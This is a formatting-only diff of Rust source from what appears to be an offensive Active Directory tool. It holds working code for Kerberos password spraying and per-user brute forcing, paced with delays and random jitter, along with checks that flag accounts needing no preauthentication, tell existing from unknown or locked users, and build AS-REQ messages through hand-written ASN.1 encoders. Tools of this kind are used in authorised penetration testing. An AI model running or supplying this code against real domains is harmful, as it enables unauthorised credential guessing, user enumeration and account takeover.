@@ -1,5 +1,5 @@
-use std::error::Error;
 use crate::kerberos::crypto;
+use std::error::Error;
 
 #[derive(Debug, Clone)]
 pub struct SprayResult {
@@ -28,7 +28,9 @@ pub async fn spray_password(
         if delay_ms > 0 {
             let jitter = if jitter_ms > 0 {
                 rand::random::<u64>() % jitter_ms
-            } else { 0 };
+            } else {
+                0
+            };
             tokio::time::sleep(std::time::Duration::from_millis(delay_ms + jitter)).await;
         }
     }
@@ -51,7 +53,9 @@ pub async fn brute_user(
         let success = result.success;
         results.push(result);
 
-        if success { break; }
+        if success {
+            break;
+        }
 
         if delay_ms > 0 {
             tokio::time::sleep(std::time::Duration::from_millis(delay_ms)).await;
@@ -68,25 +72,34 @@ async fn try_auth(dc: &str, realm: &str, username: &str, password: &str) -> Spra
     let as_req_nopreauth = build_preauth_asreq(username, realm, &[], nonce);
     let response = match crate::kerberos::send_kdc(dc, &as_req_nopreauth, false).await {
         Ok(r) => r,
-        Err(e) => return SprayResult {
-            username: username.to_string(), password: password.to_string(),
-            success: false, error_code: None,
-            error_msg: Some(format!("Network error: {}", e)),
-        },
+        Err(e) => {
+            return SprayResult {
+                username: username.to_string(),
+                password: password.to_string(),
+                success: false,
+                error_code: None,
+                error_msg: Some(format!("Network error: {}", e)),
+            }
+        }
     };
 
     if response.is_empty() {
         return SprayResult {
-            username: username.to_string(), password: password.to_string(),
-            success: false, error_code: None, error_msg: Some("Empty response".to_string()),
+            username: username.to_string(),
+            password: password.to_string(),
+            success: false,
+            error_code: None,
+            error_msg: Some("Empty response".to_string()),
         };
     }
 
     // AS-REP without preauth = no preauth required, password not validated
     if response[0] == 0x6b || response[0] == 0x7b {
         return SprayResult {
-            username: username.to_string(), password: password.to_string(),
-            success: true, error_code: None,
+            username: username.to_string(),
+            password: password.to_string(),
+            success: true,
+            error_code: None,
             error_msg: Some("No preauth required (password not validated)".to_string()),
         };
     }
@@ -96,16 +109,22 @@ async fn try_auth(dc: &str, realm: &str, username: &str, password: &str) -> Spra
     // KDC_ERR_C_PRINCIPAL_UNKNOWN = user doesn't exist
     if error_code == Some(6) {
         return SprayResult {
-            username: username.to_string(), password: password.to_string(),
-            success: false, error_code, error_msg: Some("User not found".to_string()),
+            username: username.to_string(),
+            password: password.to_string(),
+            success: false,
+            error_code,
+            error_msg: Some("User not found".to_string()),
         };
     }
 
     // KDC_ERR_CLIENT_REVOKED = account disabled/locked
     if error_code == Some(18) {
         return SprayResult {
-            username: username.to_string(), password: password.to_string(),
-            success: false, error_code, error_msg: Some("Account disabled/locked".to_string()),
+            username: username.to_string(),
+            password: password.to_string(),
+            success: false,
+            error_code,
+            error_msg: Some("Account disabled/locked".to_string()),
         };
     }
 
@@ -119,16 +138,23 @@ async fn try_auth(dc: &str, realm: &str, username: &str, password: &str) -> Spra
         etype: 23,
         no_preauth: false,
         nopac: false,
-    }).await {
+    })
+    .await
+    {
         Ok(_) => SprayResult {
-            username: username.to_string(), password: password.to_string(),
-            success: true, error_code: None, error_msg: None,
+            username: username.to_string(),
+            password: password.to_string(),
+            success: true,
+            error_code: None,
+            error_msg: None,
         },
         Err(e) => {
             let msg = e.to_string();
             SprayResult {
-                username: username.to_string(), password: password.to_string(),
-                success: false, error_code: Some(24),
+                username: username.to_string(),
+                password: password.to_string(),
+                success: false,
+                error_code: Some(24),
                 error_msg: Some(msg),
             }
         }
@@ -212,43 +238,71 @@ fn krb_error_to_string(code: u32) -> String {
 }
 
 fn parse_length(data: &[u8], pos: &mut usize) -> Result<usize, ()> {
-    if *pos >= data.len() { return Err(()); }
-    let first = data[*pos]; *pos += 1;
-    if first < 0x80 { return Ok(first as usize); }
+    if *pos >= data.len() {
+        return Err(());
+    }
+    let first = data[*pos];
+    *pos += 1;
+    if first < 0x80 {
+        return Ok(first as usize);
+    }
     let n = (first & 0x7f) as usize;
-    if n > 4 || *pos + n > data.len() { return Err(()); }
+    if n > 4 || *pos + n > data.len() {
+        return Err(());
+    }
     let mut len = 0usize;
-    for _ in 0..n { len = (len << 8) | data[*pos] as usize; *pos += 1; }
+    for _ in 0..n {
+        len = (len << 8) | data[*pos] as usize;
+        *pos += 1;
+    }
     Ok(len)
 }
 
 fn encode_length(len: usize) -> Vec<u8> {
-    if len < 0x80 { vec![len as u8] }
-    else if len < 0x100 { vec![0x81, len as u8] }
-    else { vec![0x82, (len >> 8) as u8, len as u8] }
+    if len < 0x80 {
+        vec![len as u8]
+    } else if len < 0x100 {
+        vec![0x81, len as u8]
+    } else {
+        vec![0x82, (len >> 8) as u8, len as u8]
+    }
 }
 
 fn encode_sequence_raw(items: &[&[u8]]) -> Vec<u8> {
     let mut c = Vec::new();
-    for i in items { c.extend_from_slice(i); }
-    let mut o = vec![0x30]; o.extend(encode_length(c.len())); o.extend(c); o
+    for i in items {
+        c.extend_from_slice(i);
+    }
+    let mut o = vec![0x30];
+    o.extend(encode_length(c.len()));
+    o.extend(c);
+    o
 }
 
 fn encode_context_tag(tag: u8, content: &[u8]) -> Vec<u8> {
-    let mut o = vec![0xa0 | tag]; o.extend(encode_length(content.len())); o.extend(content); o
+    let mut o = vec![0xa0 | tag];
+    o.extend(encode_length(content.len()));
+    o.extend(content);
+    o
 }
 
 fn encode_application_tag(tag: u8, content: &[u8]) -> Vec<u8> {
-    let mut o = vec![0x60 | tag]; o.extend(encode_length(content.len())); o.extend(content); o
+    let mut o = vec![0x60 | tag];
+    o.extend(encode_length(content.len()));
+    o.extend(content);
+    o
 }
 
 fn encode_integer(val: i32) -> Vec<u8> {
     let mut o = vec![0x02];
-    if val >= 0 && val < 128 { o.extend(encode_length(1)); o.push(val as u8); }
-    else {
+    if val >= 0 && val < 128 {
+        o.extend(encode_length(1));
+        o.push(val as u8);
+    } else {
         let b = val.to_be_bytes();
         let s = b.iter().position(|&x| x != 0).unwrap_or(3);
-        o.extend(encode_length(b.len() - s)); o.extend(&b[s..]);
+        o.extend(encode_length(b.len() - s));
+        o.extend(&b[s..]);
     }
     o
 }
@@ -259,29 +313,44 @@ fn encode_integer_u32(val: u32) -> Vec<u8> {
     let s = b.iter().position(|&x| x != 0).unwrap_or(3);
     let t = &b[s..];
     if t.is_empty() || t[0] & 0x80 != 0 {
-        o.extend(encode_length(t.len() + 1)); o.push(0); o.extend(t);
+        o.extend(encode_length(t.len() + 1));
+        o.push(0);
+        o.extend(t);
     } else {
-        o.extend(encode_length(t.len())); o.extend(t);
+        o.extend(encode_length(t.len()));
+        o.extend(t);
     }
     o
 }
 
 fn encode_general_string(s: &str) -> Vec<u8> {
-    let mut o = vec![0x1b]; o.extend(encode_length(s.len())); o.extend(s.as_bytes()); o
+    let mut o = vec![0x1b];
+    o.extend(encode_length(s.len()));
+    o.extend(s.as_bytes());
+    o
 }
 
 fn encode_generalized_time(t: &str) -> Vec<u8> {
-    let mut o = vec![0x18]; o.extend(encode_length(t.len())); o.extend(t.as_bytes()); o
+    let mut o = vec![0x18];
+    o.extend(encode_length(t.len()));
+    o.extend(t.as_bytes());
+    o
 }
 
 fn encode_bitstring(data: &[u8]) -> Vec<u8> {
-    let mut o = vec![0x03]; o.extend(encode_length(data.len() + 1)); o.push(0); o.extend(data); o
+    let mut o = vec![0x03];
+    o.extend(encode_length(data.len() + 1));
+    o.push(0);
+    o.extend(data);
+    o
 }
 
 fn encode_principal_name(name_type: i32, names: &[&str]) -> Vec<u8> {
     let nt = encode_integer(name_type);
     let mut ns = Vec::new();
-    for n in names { ns.extend(encode_general_string(n)); }
+    for n in names {
+        ns.extend(encode_general_string(n));
+    }
     let nseq = encode_sequence_raw(&[&ns]);
     let mut c = Vec::new();
     c.extend(encode_context_tag(0, &nt));
